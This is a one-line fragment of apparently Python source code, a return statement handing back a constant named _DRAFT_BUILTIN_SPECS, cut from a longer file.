    return _DRAFT_BUILTIN_SPECS
